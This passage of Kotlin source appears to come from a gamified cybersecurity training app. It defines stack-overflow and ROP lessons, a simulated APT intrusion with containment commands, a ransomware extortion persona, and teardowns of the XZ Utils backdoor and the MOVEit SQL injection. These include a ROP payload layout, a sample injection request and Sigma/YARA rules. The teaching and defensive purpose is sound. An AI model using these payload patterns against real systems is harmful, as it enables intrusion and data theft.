      tier = "Specialist Tier • Low-Level CS & Security Research",
      conceptSummary = "Understanding how the CPU stack grows downward in memory, how registers (RIP, RSP, RBP) coordinate function execution frames, and how return addresses are preserved.",
      disassemblyCode = """
        0000000000401142 <vulnerable_function>:
          401142: push   %rbp
          401143: mov    %rsp,%rbp
          401146: sub    $0x40,%rsp             ; Allocate 64 bytes on stack
          40114a: lea    -0x40(%rbp),%rax       ; Buffer address
          40114e: mov    %rax,%rdi
          401151: call   401030 <gets@plt>      ; ❌ Unbounded read into buffer!
          401156: leave
          401157: ret                           ; Pops saved RIP from stack!
      """.trimIndent(),
      stackLayoutExplanation = "The stack frame allocates 64 bytes (-0x40). Above the buffer sits the 8-byte Saved RBP (+64), followed immediately by the 8-byte Saved RIP (Return Instruction Pointer at +72 bytes). An unbounded read overwrites RIP to redirect control flow.",
      registersState = mapOf(
        "RIP" to "0x0000000000401157 (ret)",
        "RSP" to "0x00007fffffffe200 (Stack Top)",
        "RBP" to "0x00007fffffffe240 (Base Pointer)",
        "RAX" to "0x00007fffffffe200 (Buffer Start)"
      ),
      mitigationMechanisms = listOf(
        "Stack Canaries (-fstack-protector): Generates a random guard cookie before the saved RIP; aborts execution if modified.",
        "DEP / NX Bit (Non-Executable Stack): Marks stack memory pages non-executable, preventing raw shellcode execution.",
        "ASLR (Address Space Layout Randomization): Randomizes memory offsets for stack, heap, and libraries at runtime.",
        "Memory-Safe Languages (Rust / Go / Swift): Eliminates raw pointer arithmetic and enforces compile-time bounds checking."
      ),
      interactiveVerificationPrompt = "Calculate the exact byte offset required to reach the Saved Return Address (RIP) on this x86-64 stack frame:",
      correctCalculatedOffset = "72",
      securityResearchTakeaway = "In modern security research, understanding low-level memory layouts is critical for evaluating whether architectural mitigations (CFI, SafeStack, Memory Tagging Extensions) sufficiently protect systems against memory corruption."
    ),
    BinaryExploitationModule(
      id = "bin_02",
      title = "Return-Oriented Programming (ROP) & DEP/NX Bypass Concepts",
      tier = "Specialist Tier • Security Research",
      conceptSummary = "When the NX bit prevents executing code on the stack, attackers link existing executable instruction sequences ending in 'ret' (gadgets) to construct arbitrary execution chains.",
      disassemblyCode = """
        ; Gadget 1: pop %rdi; ret (0x40120b)
        ; Gadget 2: pop %rsi; ret (0x401211)
        ; Target function: system("/bin/sh") at (0x401050)
        
        [ Payload Chain: 72 bytes Padding + 0x40120b + 0x4040a0 ("/bin/sh") + 0x401050 ]
      """.trimIndent(),
      stackLayoutExplanation = "Each gadget executes a tiny operation (like loading a register) and then executes 'ret', which pops the next gadget address from the attacker-controlled stack, creating a Turing-complete execution flow.",
      registersState = mapOf(
        "RIP" to "0x000000000040120b (pop %rdi; ret)",
        "RSP" to "0x00007fffffffe248",
        "RDI" to "0x00000000004040a0 (\"/bin/sh\")",
        "RAX" to "0x000000000000003b (sys_execve)"
      ),
      mitigationMechanisms = listOf(
        "Control Flow Integrity (CFI): Hardware-enforced validation of indirect call and return targets (e.g. Intel CET / ARM BTI).",
        "PIE (Position Independent Executable): Randomizes base code addresses so gadget offsets cannot be hardcoded.",
        "Formal Verification & Memory Safety: Migrating low-level C components to Rust."
      ),
      interactiveVerificationPrompt = "What instruction must every ROP gadget terminate with to maintain the chain?",
      correctCalculatedOffset = "ret",
      securityResearchTakeaway = "ROP demonstrates why modern security engineering has shifted toward proactive memory safety by default (Memory Safe Languages Act, Android Rust kernel components) rather than relying exclusively on reactive OS mitigations."
    )
  )

  // =========================================================================
  // 18. DOMAIN COVERAGE MAP & CAREER CHECKLIST
  // =========================================================================
  val domainCoverageAreas: List<SpecializedDomainOverview> = listOf(
    SpecializedDomainOverview(
      domainId = "soc_blue",
      domainName = "SOC Defense & Alert Triage",
      iconName = "Shield",
      referencePlatform = "Let's Defend / BTLO",
      statusBadge = "Fully Implemented (Phase 4)",
      handsOnMechanic = "Live SIEM Incident Range, Alert Fatigue Simulator, Incident Counterfactuals",
      coveredModulesCount = 18,
      mitreMapping = "TA0001 → TA0011 (Full Lifecycle)"
    ),
    SpecializedDomainOverview(
      domainId = "dfir_forensics",
      domainName = "Digital Forensics & Incident Response (DFIR)",
      iconName = "Search",
      referencePlatform = "CyberDefenders / BTLO",
      statusBadge = "Fully Implemented",
      handsOnMechanic = "Digital Incident Journal, Memory/Auth Log Triage, Evidence Chain Verification",
      coveredModulesCount = 14,
      mitreMapping = "TA0007 (Discovery), TA0010 (Exfiltration)"
    ),
    SpecializedDomainOverview(
      domainId = "linux_windows_ladders",
      domainName = "Linux & Windows Terminal Ladders",
      iconName = "Terminal",
      referencePlatform = "OverTheWire (Bandit) & UnderTheWire",
      statusBadge = "Fully Implemented (Sequential Ladders)",
      handsOnMechanic = "Zero-hand-holding 16-level CLI progression, auto-passcode unlocks, regex & pipe analysis",
      coveredModulesCount = 32,
      mitreMapping = "TA0002 (Execution), TA0005 (Defense Evasion)"
    ),
    SpecializedDomainOverview(
      domainId = "web_appsec_ladder",
      domainName = "Web Application Security Ladder",
      iconName = "Language",
      referencePlatform = "PortSwigger Web Security Academy",
      statusBadge = "Fully Implemented (Sequential Topics)",
      handsOnMechanic = "Sequential vulnerability ladders (SQLi, XSS, SSRF, IDOR) + Scenario Mutation Engine",
      coveredModulesCount = 20,
      mitreMapping = "CWE Top 25 / OWASP Top 10"
    ),
    SpecializedDomainOverview(
      domainId = "appsec_patch_workflow",
      domainName = "Business App Remediation & Patching",
      iconName = "Build",
      referencePlatform = "CMD+CTRL Cyber Range",
      statusBadge = "Fully Implemented (Remediation First)",
      handsOnMechanic = "Discover flaw → Quantify business risk/HIPAA blast radius → Apply verified secure code patch",
      coveredModulesCount = 12,
      mitreMapping = "CWE-89, CWE-639, CWE-918, NIST SP 800-53"
    ),
    SpecializedDomainOverview(
      domainId = "binary_exploitation",
      domainName = "Binary Exploitation & Low-Level CS",
      iconName = "Memory",
      referencePlatform = "pwn.college / Security Research",
      statusBadge = "Specialist Tier (Sandboxed Architecture)",
      handsOnMechanic = "x86-64 stack frame layout, RBP/RIP offset calculation, ASLR/DEP mitigations, Ghidra disassembly",
      coveredModulesCount = 8,
      mitreMapping = "CWE-119, CWE-121, CWE-122"
    ),
    SpecializedDomainOverview(
      domainId = "mobile_security",
      domainName = "Mobile Security (Android & iOS)",
      iconName = "Smartphone",
      referencePlatform = "OWASP MASTG / Mobile CTF",
      statusBadge = "Fully Covered in Curriculum",
      handsOnMechanic = "Android Intent Hijacking, Keystore Storage Security, Smali Decompilation & Hardcoded Token Audits",
      coveredModulesCount = 9,
      mitreMapping = "OWASP Mobile Top 10"
    ),
    SpecializedDomainOverview(
      domainId = "iot_scada_ot",
      domainName = "IoT, OT & SCADA Industrial Security",
      iconName = "Sensors",
      referencePlatform = "SANS ICS / Industrial Range",
      statusBadge = "Fully Covered in Curriculum",
      handsOnMechanic = "Modbus TCP Protocol Auditing, SCADA Telemetry Anomalies, Industrial Control Air-Gap Segmentation",
      coveredModulesCount = 7,
      mitreMapping = "MITRE ATT&CK for ICS"
    ),
    SpecializedDomainOverview(
      domainId = "cloud_devsecops",
      domainName = "Cloud Security & DevSecOps",
      iconName = "Cloud",
      referencePlatform = "Attack Defense / Cloud CTF",
      statusBadge = "Fully Implemented",
      handsOnMechanic = "AWS IAM Role Assumption, S3 Bucket Misconfigurations, Kubernetes RBAC Audits",
      coveredModulesCount = 15,
      mitreMapping = "MITRE ATT&CK for Cloud"
    )
  )

  // ==========================================
  // 19. AUTONOMOUS ADVERSARY "SHADOW AGENT" ENGINE
  // ==========================================
  private val _shadowState = MutableStateFlow(
    ShadowAdversaryState(
      scenarioId = "scen_shadow_zero_day_01",
      threatActorName = "APT-29 (Cosmic Lynx Swarm)",
      currentPhase = AdversaryMutationPhase.INITIAL_RECON,
      compromiseLevelPercent = 38,
      activeAdversaryIp = "185.220.101.5",
      targetedHost = "PROD-DC01.corp.aegora.internal",
      mutationHistory = listOf(
        "Adversary initiated TCP SYN Port Sweep on port 445 (SMB) & 88 (Kerberos)",
        "Adversary attempted Spray against Service Accounts (srv_backup, srv_sql)"
      ),
      telemetryStream = listOf(
        "[SYSMON-1] Process creation: whoami.exe /all (PID: 4921) on PROD-DC01",
        "[ZEEK-DNS] High entropy query: 4a8f9c.tunnel.c2.aegora.io TXT record",
        "[AUTH-4625] Anomaly: 48 failed logon attempts for administrator in 12s",
        "[EDR-ALERT] Memory injection attempt detected in lsass.exe process space"
      ),
      tactics = listOf(
        MitreTacticStep("TA0001", "Initial Access", "T1078", "Valid Accounts Spray", isCurrentActive = false, isMitigated = true),
        MitreTacticStep("TA0002", "Execution", "T1059.001", "PowerShell Encoded Script", isCurrentActive = true, isMitigated = false),
        MitreTacticStep("TA0003", "Persistence", "T1053.005", "Scheduled Task / WMI", isCurrentActive = false, isMitigated = false),
        MitreTacticStep("TA0004", "Privilege Escalation", "T1068", "Exploitation for Privilege", isCurrentActive = false, isMitigated = false),
        MitreTacticStep("TA0005", "Defense Evasion", "T1574.002", "DLL Side-Loading", isCurrentActive = false, isMitigated = false),
        MitreTacticStep("TA0008", "Lateral Movement", "T1021.002", "SMB/Windows Admin Shares", isCurrentActive = false, isMitigated = false),
        MitreTacticStep("TA0010", "Exfiltration", "T1048.003", "Exfiltration Over DNS Tunnel", isCurrentActive = false, isMitigated = false)
      ),
      deployedCanaries = listOf(
        DeceptionCanaryToken(
          id = "canary_aws_01",
          name = "AWS_SECRET_ACCESS_KEY Canary Token",
          type = "AWS IAM Secret",
          deployedHost = "PROD-DC01",
          isTripped = true,
          tripTimestamp = "2 mins ago",
          adversaryIp = "185.220.101.5"
        ),
        DeceptionCanaryToken(
          id = "canary_spn_02",
          name = "Decoy Kerberos SPN (MSSQLSvc/db01)",
          type = "Kerberos SPN",
          deployedHost = "SQL-PROD-02",
          isTripped = false
        )
      )
    )
  )
  val shadowState: StateFlow<ShadowAdversaryState> = _shadowState.asStateFlow()

  fun plantCanaryToken(name: String, type: String, host: String) {
    val current = _shadowState.value
    val newToken = DeceptionCanaryToken(
      id = "canary_${UUID.randomUUID().toString().take(6)}",
      name = name,
      type = type,
      deployedHost = host,
      isTripped = false
    )
    _shadowState.value = current.copy(
      deployedCanaries = current.deployedCanaries + newToken,
      telemetryStream = listOf("[DECEPTION-ENGINE] Successfully armed Canary Token ($name) on $host") + current.telemetryStream
    )
  }

  fun executeContainmentCommand(command: String): String {
    val current = _shadowState.value
    val cmd = command.trim()
    recordInvestigationAction("CLI Command", "CONTAINMENT_ACTION", "Executed: $cmd", true)

    return when {
      cmd.startsWith("isolate-host") -> {
        val newHistory = current.mutationHistory + "DEFENDER ACTION: Host Isolated via EDR API." +
            "⚡ ADVERSARY MUTATION: AI pivots from Direct Network Access to DLL Side-Loading on Staged Worker Node!"
        val updatedTactics = current.tactics.map {
          if (it.techniqueId == "T1059.001") it.copy(isCurrentActive = false, isMitigated = true)
          else if (it.techniqueId == "T1574.002") it.copy(isCurrentActive = true)
          else it
        }
        _shadowState.value = current.copy(
          currentPhase = AdversaryMutationPhase.DLL_HIJACK,
          compromiseLevelPercent = (current.compromiseLevelPercent - 15).coerceAtLeast(10),
          mutationHistory = newHistory,
          tactics = updatedTactics,
          telemetryStream = listOf(
            "[CONTAINMENT] Host isolated. Inbound/Outbound TCP reset.",
            "[SHADOW-AI-ADAPT] Adversary mutated tactic: Hooked local app dll (version.dll) via memory injection!"
          ) + current.telemetryStream
        )
        "✓ Host isolated. [ALERT]: Shadow AI detected packet cutoff and mutated to Phase 3 (DLL Side-Loading & Memory Injection)!"
      }
      cmd.startsWith("revoke-session") -> {
        _shadowState.value = current.copy(
          compromiseLevelPercent = (current.compromiseLevelPercent - 20).coerceAtLeast(5),
          telemetryStream = listOf(
            "[IDENTITY] Kerberos TGT & OAuth sessions purged for compromised user.",
            "[SHADOW-AI] Adversary access token invalidated."
          ) + current.telemetryStream
        )
        "✓ All active sessions revoked and Kerberos tickets flushed."
      }
      cmd.startsWith("deploy-canary") -> {
        plantCanaryToken("Synthetic Admin Canary", "Active Directory Service Credential", "PROD-DC01")
        "✓ Synthetic Canary Token armed. Telemetry hook listening for automated harvesting."
      }
      cmd.startsWith("flush-dns") -> {
        _shadowState.value = current.copy(
          telemetryStream = listOf("[DNS-CACHE] Local resolver cache flushed. Sinkhole routing applied.") + current.telemetryStream
        )
        "✓ DNS cache cleared and malicious C2 domains routed to internal sinkhole."
      }
      cmd.startsWith("contain-full") || cmd.startsWith("quarantine") -> {
        _shadowState.value = current.copy(
          isContained = true,
          compromiseLevelPercent = 0,
          currentPhase = AdversaryMutationPhase.INITIAL_RECON,
          telemetryStream = listOf("[STATUS] Complete enterprise kill-chain severed. Threat actor neutralized.") + current.telemetryStream
        )
        "✓ ZERO-TRUST ENCLAVE ENFORCED. Shadow Adversary kill-chain successfully severed!"
      }
      else -> {
        _shadowState.value = current.copy(
          telemetryStream = listOf("[CLI] Executed diagnostic query: $cmd") + current.telemetryStream
        )
        "Executed: $cmd (Telemetry logged to investigation buffer)"
      }
    }
  }

  // ==========================================
  // 20. INCIDENT TIME-MACHINE & SPLIT-TIMELINE FORKING
  // ==========================================
  private val _timelineBranches = MutableStateFlow(
    listOf(
      TimelineBranch(
        branchId = "branch_alpha",
        branchName = "Timeline Alpha: Immediate Network Isolation",
        strategyLabel = "Containment First (Surgical Lock)",
        description = "Immediately pull the network plug on PROD-DC01 and core subnet. Halts data exfiltration instantly but causes enterprise downtime for 8,000 employees.",
        actionsTaken = listOf(
          "T+00:02 - EDR Network Isolation of Active Directory Cluster",
          "T+00:05 - Terminate all active VPN tunnels & BGP routes",
          "T+00:12 - Hard reboot domain controllers into Directory Services Restore Mode"
        ),
        metrics = TimelineDiffMetrics(
          operationalDowntimeHours = 6.5f,
          exfiltrationBlastRadiusMb = 12,
          reputationalImpactScore = 24,
          estimatedComplianceFineUsd = 0,
          containmentConfidencePercent = 98
        ),
        isSelected = true
      ),
      TimelineBranch(
        branchId = "branch_beta",
        branchName = "Timeline Beta: Canary Decoy & Traffic Mirroring",
        strategyLabel = "Intelligence Gathering (Active Honey-mesh)",
        description = "Keep subnet active under deep packet mirroring. Deploy canary database credentials to trace the threat actor's entire infrastructure and C2 command nodes before terminating.",
        actionsTaken = listOf(
          "T+00:02 - Enable Full Packet Capture (PCAP) on TAP/SPAN port",
          "T+00:06 - Seed Canary AWS IAM Key into bash_history",
          "T+00:15 - Adversary uses Canary Key -> Reveals secondary C2 proxy in Frankfurt"
        ),
        metrics = TimelineDiffMetrics(
          operationalDowntimeHours = 0.5f,
          exfiltrationBlastRadiusMb = 480,
          reputationalImpactScore = 65,
          estimatedComplianceFineUsd = 150000,
          containmentConfidencePercent = 75
        ),
        isSelected = false
      )
    )
  )
  val timelineBranches: StateFlow<List<TimelineBranch>> = _timelineBranches.asStateFlow()

  val timelineScrubPoints = listOf(
    TimelineIncidentScrubPoint(
      timestampSeconds = 0,
      timeLabel = "00:00:00",
      systemEvent = "Initial Phishing Ingress",
      packetHexSummary = "48 83 ec 28 48 8b 05 ... GET /invoice.pdf.exe",
      isRootCauseTrigger = true,
      forensicFinding = "Weaponized macro downloaded stage-1 dropper via PowerShell curl"
    ),
    TimelineIncidentScrubPoint(
      timestampSeconds = 45,
      timeLabel = "00:00:45",
      systemEvent = "LSASS Memory Dump",
      packetHexSummary = "55 48 89 e5 48 83 ec ... MiniDumpWriteDump(lsass.exe)",
      isRootCauseTrigger = false,
      forensicFinding = "Harvested NTLM hashes for srv_backup and domain admin accounts"
    ),
    TimelineIncidentScrubPoint(
      timestampSeconds = 120,
      timeLabel = "00:02:00",
      systemEvent = "Lateral SMB Relay Execution",
      packetHexSummary = "fe 53 4d 42 40 00 ... SMB2_TREE_CONNECT (ADMIN$)",
      isRootCauseTrigger = false,
      forensicFinding = "Authenticated to PROD-DC01 using stolen Kerberos ticket (Overpass-the-Hash)"
    ),
    TimelineIncidentScrubPoint(
      timestampSeconds = 240,
      timeLabel = "00:04:00",
      systemEvent = "DNS C2 Beacon & Ransomware Staging",
      packetHexSummary = "00 01 01 00 00 01 ... TXT c2-beacon.aegora.io",
      isRootCauseTrigger = false,
      forensicFinding = "Staged LockBit 3.0 encryptor binary in C:\\Windows\\Temp\\svc_update.exe"
    )
  )

  fun selectTimelineBranch(branchId: String) {
    _timelineBranches.value = _timelineBranches.value.map {
      it.copy(isSelected = it.branchId == branchId)
    }
  }

  // ==========================================
  // 21. BIOMETRIC STRESS & ACOUSTIC THREAT SONIFICATION
  // ==========================================
  private val _bioStressReading = MutableStateFlow(
    BioStressReading(
      simulatedBpm = 82,
      touchVelocityPxPerSec = 142.5f,
      tapHesitationMs = 420,
      composureIndexScore = 91,
      cognitiveOverloadWarning = false,
      triageCadenceStatus = "ANALYTICAL & MEASURED"
    )
  )
  val bioStressReading: StateFlow<BioStressReading> = _bioStressReading.asStateFlow()

  fun recordInteractionKinetics(velocity: Float, hesitationMs: Long) {
    val current = _bioStressReading.value
    val newBpm = (70 + (velocity / 20).toInt() + (hesitationMs / 100).toInt()).coerceIn(60, 150)
    val isOverload = newBpm > 115 || hesitationMs > 1800
    val composure = (100 - (newBpm - 70) * 0.8f - (hesitationMs / 80)).toInt().coerceIn(10, 99)
    val status = when {
      composure >= 85 -> "ANALYTICAL & MEASURED"
      composure >= 65 -> "ELEVATED ALERTNESS"
      else -> "PANIC / COGNITIVE OVERLOAD"
    }

    _bioStressReading.value = current.copy(
      simulatedBpm = newBpm,
      touchVelocityPxPerSec = velocity,
      tapHesitationMs = hesitationMs,
      composureIndexScore = composure,
      cognitiveOverloadWarning = isOverload,
      triageCadenceStatus = status
    )
  }

  val acousticProfiles = listOf(
    AcousticThreatProfile(
      id = "ac_01",
      name = "Baseline Enterprise Traffic",
      trafficType = "Legitimate HTTPS & Microservices",
      wavePattern = "STEADY_SIN_WAVE",
      frequencyKhz = 1.2f,
      audioDescription = "Harmonic ambient white noise with steady, low-variance amplitude oscillations.",
      diagnosticSignature = "Normal TCP handshakes, constant 443 stream with negligible jitter"
    ),
    AcousticThreatProfile(
      id = "ac_02",
      name = "Periodic C2 Heartbeat Beacon",
      trafficType = "Cobalt Strike / Sliver Beaconing",
      wavePattern = "PULSING_C2_HEARTBEAT",
      frequencyKhz = 3.8f,
      audioDescription = "Rhythmic, periodic acoustic pulses at precise 60s intervals (low-jitter beacon signature).",
      diagnosticSignature = "Fixed delta-T packet spacing (sleep=60, jitter=0%) bypassing simple firewall threshold"
    ),
    AcousticThreatProfile(
      id = "ac_03",
      name = "DNS Exfiltration Chirp",
      trafficType = "Covert DNS Tunnel (TXT records)",
      wavePattern = "CHIRPING_DNS_TUNNEL",
      frequencyKhz = 7.4f,
      audioDescription = "High-frequency acoustic chirps and stuttering bursts corresponding to Base64 TXT chunks.",
      diagnosticSignature = "Subdomain entropy > 4.8 with average query length of 180 bytes per burst"
    ),
    AcousticThreatProfile(
      id = "ac_04",
      name = "DDoS SYN Flood Surge",
      trafficType = "Volumetric Botnet Saturation",
      wavePattern = "HIGH_FREQ_SYN_SURGE",
      frequencyKhz = 14.2f,
      audioDescription = "Accelerating, screeching broadband sonic saturation overwhelming receiver channels.",
      diagnosticSignature = "600k pkts/sec SYN packets without ACK responses exhausting TCP backlog queues"
    )
  )

  // ==========================================
  // 22. VOICE INCIDENT WAR ROOM & CRISIS ESCALATION
  // ==========================================
  private val _warRoomPersonas = MutableStateFlow(
    listOf(
      WarRoomPersona(
        id = "p_ciso",
        name = "Elena Rostova",
        title = "Chief Information Security Officer",
        role = WarRoomPersonaRole.CISO,
        avatarIcon = "Security",
        activeQuote = "\"Operator, the board wants containment status NOW. Do we pull the datacenter off the wire or can you isolate the C2 beacon?\"",
        stressLevel = 88
      ),
      WarRoomPersona(
        id = "p_legal",
        name = "Marcus Vance, Esq.",
        title = "General Counsel & Regulatory Lead",
        role = WarRoomPersonaRole.LEGAL_COUNSEL,
        avatarIcon = "Gavel",
        activeQuote = "\"If personal customer records crossed that perimeter, the GDPR 72-hour notification clock and SEC Form 8-K timer have already started!\"",
        stressLevel = 74
      ),
      WarRoomPersona(
        id = "p_pr",
        name = "Sophia Chen",
        title = "Head of Global Corporate PR",
        role = WarRoomPersonaRole.PR_COMMUNICATIONS,
        avatarIcon = "Campaign",
        activeQuote = "\"Reuters and BleepingComputer just DM'd me. Threat actors claim they hold 4TB of our source code. Do I issue a holding statement?\"",
        stressLevel = 92
      ),
      WarRoomPersona(
        id = "p_extortionist",
        name = "CYBER_SYNDICATE_BLACK",
        title = "Ransomware Extortion Actor",
        role = WarRoomPersonaRole.EXTORTIONIST,
        avatarIcon = "Warning",
        activeQuote = "\"Your Active Directory is locked with ChaCha20. Send 45 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa within 4 hours or data goes to Tor.\"",
        stressLevel = 100
      )
    )
  )
  val warRoomPersonas: StateFlow<List<WarRoomPersona>> = _warRoomPersonas.asStateFlow()

  private val _warRoomDials = MutableStateFlow(
    WarRoomTriageDials(
      timeRemainingSeconds = 240,
      operationalDowntimePercent = 42,
      reputationalRiskPercent = 68,
      exfiltrationBlastRadiusPercent = 35,
      regulatoryFineExposurePercent = 50
    )
  )
  val warRoomDials: StateFlow<WarRoomTriageDials> = _warRoomDials.asStateFlow()

  // ==========================================
  // 23. ZERO-DAY DECONSTRUCTOR & DETECTION ENGINEERING
  // ==========================================
  val zeroDayExploits = listOf(
    ZeroDayExploitModel(
      cveId = "CVE-2024-3094",
      title = "XZ Utils Embedded SSH Backdoor",
      cvssScore = 10.0f,
      attackVector = "Supply Chain / Memory Hook",
      affectedComponent = "liblzma / OpenSSH daemon",
      memoryStackFlow = listOf(
        "1. Build script injects obfuscated M4 macro into configure step",
        "2. Liblzma DSO loads before libcrypto via glibc IFUNC resolver",
        "3. Backdoor intercepts RSA_public_decrypt function pointer",
        "4. Injects arbitrary payload execution prior to SSH signature check"
      ),
      exploitProofSnippet = "// Hooking IFUNC pointer table:\nvoid* __wrap_RSA_public_decrypt(...) {\n    if (verify_magic_ed448_signature(payload)) {\n        return execute_stage2_payload(rdi);\n    }\n    return real_RSA_public_decrypt(...);\n}",
      sigmaRuleTemplate = "title: XZ Utils Backdoor IFUNC Hijack\nlogsource:\n  category: process_creation\n  product: linux\ndetection:\n  selection:\n    Image|endswith: '/sshd'\n    CommandLine|contains: 'liblzma'\n  condition: selection\nlevel: critical",
      yaraRuleTemplate = "rule Backdoor_XZ_Utils_liblzma {\n  strings:\n    " + "$" + "magic = { 48 8d 3d ?? ?? ?? ?? 48 89 c6 48 89 d7 }\n    " + "$" + "sub = \"_get_cpuid\"\n  condition:\n    uint32(0) == 0x464c457f and all of them\n}",
      mitigationStrategy = "Downgrade xz-utils to 5.4.x, verify package checksums against upstream source repository."
    ),
    ZeroDayExploitModel(
      cveId = "CVE-2023-34362",
      title = "MOVEit Transfer Pre-Auth SQL Injection",
      cvssScore = 9.8f,
      attackVector = "Web Protocol / SQL Injection",
      affectedComponent = "moveitisapi.dll",
      memoryStackFlow = listOf(
        "1. Attacker sends forged X-siLock-Session-Info HTTP header",
        "2. Unsanitized session headers deserialized directly into SQL query",
        "3. SQLi grants authenticated session token for guest user",
        "4. Weaponized human2.aspx webshell written to webroot"
      ),
      exploitProofSnippet = "POST /moveitisapi/moveitisapi.dll?action=m2 HTTP/1.1\nHost: target.corp\nX-siLock-Session-Info: {'SessionUser':'admin' UNION SELECT 1, 'human2.aspx'--}\n\n[Payload: WebShell dropped]",
      sigmaRuleTemplate = "title: MOVEit Transfer Webshell Creation\nlogsource:\n  category: file_event\n  product: windows\ndetection:\n  selection:\n    TargetFilename|endswith: '\\human2.aspx'\n  condition: selection\nlevel: critical",
      yaraRuleTemplate = "rule Webshell_MOVEit_human2 {\n  strings:\n    " + "$" + "pass = \"X-siLock-Step\"\n    " + "$" + "cmd = \"Response.BinaryWrite\"\n  condition:\n    all of them\n}",
      mitigationStrategy = "Apply Progress software security patch, delete untrusted .aspx files in C:\\MOVEitTransfer\\wwwroot."
    )
  )

  // ==========================================
  // 24. GLOBAL CYBER RADAR & TOURNAMENT LEAGUE
  // ==========================================
  val globalRadarItems = listOf(
    GlobalRadarItem(
      id = "rad_01",
      title = "DEF CON 34 Live Arena & War Games",
      category = "DEF CON Livecast",
      organizer = "DEF CON Communications",
      dateOrTimeLeft = "LIVE NOW",
      prizeOrPoints = "Black Badge + 5,000 XP",
      liveStatus = "LIVE NOW",
      deepLinkTarget = "arena_defcon"
    ),
    GlobalRadarItem(
      id = "rad_02",
      title = "Black Hat USA: Advanced Memory Corruption Briefings",
      category = "Black Hat Briefing",
      organizer = "Informa Tech",
      dateOrTimeLeft = "Tomorrow at 09:00 PST",
      prizeOrPoints = "Keynote Stream",
      liveStatus = "UPCOMING",
      deepLinkTarget = "briefing_blackhat"
    ),
    GlobalRadarItem(
      id = "rad_03",
      title = "PicoCTF & Collegiate Cyber Defense Match",
      category = "World CTF Match",
      organizer = "Carnegie Mellon University",
      dateOrTimeLeft = "3h 42m Remaining",
      prizeOrPoints = "$25,000 Bounty Pool",
      liveStatus = "LIVE NOW",
      deepLinkTarget = "ctf_collegiate"
    ),
    GlobalRadarItem(
      id = "rad_04",
      title = "Critical Zero-Day Bounty: Hypervisor VM Escape",
      category = "Live Bug Bounty",
      organizer = "HackerOne / Zerodium",
      dateOrTimeLeft = "Open Submissions",
      prizeOrPoints = "$250,000 Bounty",
      liveStatus = "ACTIVE BOUNTY",
      deepLinkTarget = "bounty_vm_escape"
    )
  )

  val cyberLeagueTeams = listOf(
    CyberLeagueTeam(
      rank = 1,
      teamName = "Aegora Red Cell Elite",
      tier = "Enterprise SOC Squad",
      organization = "Aegora Cyber Defense Lab",
      attackPoints = 4820,
      defensePoints = 5190,
      totalScore = 10010,
      verificationBadge = "LEGENDARY"
    ),
    CyberLeagueTeam(
      rank = 2,
      teamName = "MIT Quantum Pwners",
      tier = "University Cohort",
      organization = "MIT CyberSec Society",
      attackPoints = 4610,
      defensePoints = 4920,
      totalScore = 9530,
      verificationBadge = "VERIFIED EDU"
    ),
    CyberLeagueTeam(
      rank = 3,
      teamName = "DARPA Swarm Defenders",
      tier = "Enterprise SOC Squad",
      organization = "National Defense Cyber Taskforce",
      attackPoints = 4200,
      defensePoints = 5050,
      totalScore = 9250,
      verificationBadge = "GOV VERIFIED"
    ),
    CyberLeagueTeam(
      rank = 4,
      teamName = "Operative_Valkyrie",
      tier = "Solo Operative",
      organization = "Independent Security Researcher",
      attackPoints = 4450,
      defensePoints = 4120,
      totalScore = 8570,
      verificationBadge = "PRO OPERATIVE"
    )
  )

  // ==========================================
  // 25. AUTONOMOUS RED-VS-BLUE SWARM ARENA
  // ==========================================
  private val _swarmBattleState = MutableStateFlow(
    SwarmArenaCombatState(
      battleId = "swarm_b_09",
      redSwarmName = "Chimera AI Red Swarm",
      blueSwarmName = "Aegora Blue Sentinel Swarm",
      enterpriseCompromisePercent = 45,
      activeSwarmRound = 3,
      recentCombatLogs = listOf(
        "⚡ [RED SWARM] Executed Token Impersonation on srv_sql (PID: 8812)",
        "🛡️ [BLUE SENTINEL] Auto-deployed Honey-Token on Shared Kerberos Cache",
        "⚡ [RED SWARM] Harvested Honey-Token! Alarm tripped across entire subnet.",
        "🛡️ [BLUE SENTINEL] Micro-segmented Subnet 192.168.4.0/24 with eBPF filter"
      ),
      commanderActionsAvailable = listOf(
        "Inject Strict Kerberos Armoring",
        "Deploy Canary AWS Keys",
        "Enforce eBPF Kernel Syscall Filter",
        "Quarantine Domain Controller Subnet"
      ),
      isVictoryAchieved = false
    )
  )
  val swarmBattleState: StateFlow<SwarmArenaCombatState> = _swarmBattleState.asStateFlow()

  fun injectSwarmDirective(directive: String) {
    val current = _swarmBattleState.value
    val newCompromise = (current.enterpriseCompromisePercent - 18).coerceAtLeast(0)
    val victory = newCompromise == 0
    val newLogs = listOf(
      "👑 [HUMAN COMMANDER] Injected Directive: \"$directive\"",
      "🛡️ [BLUE SENTINEL] Applied heuristic rule. Red Swarm lateral pivot severed!"
    ) + current.recentCombatLogs

    _swarmBattleState.value = current.copy(
      enterpriseCompromisePercent = newCompromise,
      activeSwarmRound = current.activeSwarmRound + 1,
      recentCombatLogs = newLogs.take(10),
      isVictoryAchieved = victory
    )
  }

  // ==========================================
  // 26. UNIVERSAL CROSS-DEVICE ARCHITECTURE STATE
  // ==========================================
  private val _performanceMode = MutableStateFlow(PerformanceMode.FULL_VISUAL)
  val performanceMode: StateFlow<PerformanceMode> = _performanceMode.asStateFlow()

  private val _networkSyncStatus = MutableStateFlow(NetworkSyncStatus.SYNCED)
  val networkSyncStatus: StateFlow<NetworkSyncStatus> = _networkSyncStatus.asStateFlow()

  private val _crossDeviceSession = MutableStateFlow(
    CrossDeviceSessionState(
      activeSessionId = "sess_v11_9942",
      lastActivityTitle = "Investigation #4821 — Golden Ticket Ransomware",
      lastActivityCategory = "Live SOC Incident Range",
      lastActivityProgress = "Step 3/5: Kerberoasting Anomaly Triage",
      lastActiveTimestamp = "Synchronized 2 min ago",
      originDeviceName = "MacBook Pro / Desktop Station",
      targetScreenTag = "live_soc_range",
      uncommittedNotesCount = 2,
      isConflictPresent = false,
      syncStatus = NetworkSyncStatus.SYNCED
    )
  )
  val crossDeviceSession: StateFlow<CrossDeviceSessionState> = _crossDeviceSession.asStateFlow()

  fun setPerformanceMode(mode: PerformanceMode) {
    _performanceMode.value = mode
  }

  fun setNetworkSyncStatus(status: NetworkSyncStatus) {
    _networkSyncStatus.value = status
    _crossDeviceSession.value = _crossDeviceSession.value.copy(syncStatus = status)
  }

  fun triggerManualSync() {
    _networkSyncStatus.value = NetworkSyncStatus.SYNCING
    // Simulated safe instant cloud sync
    _networkSyncStatus.value = NetworkSyncStatus.SYNCED
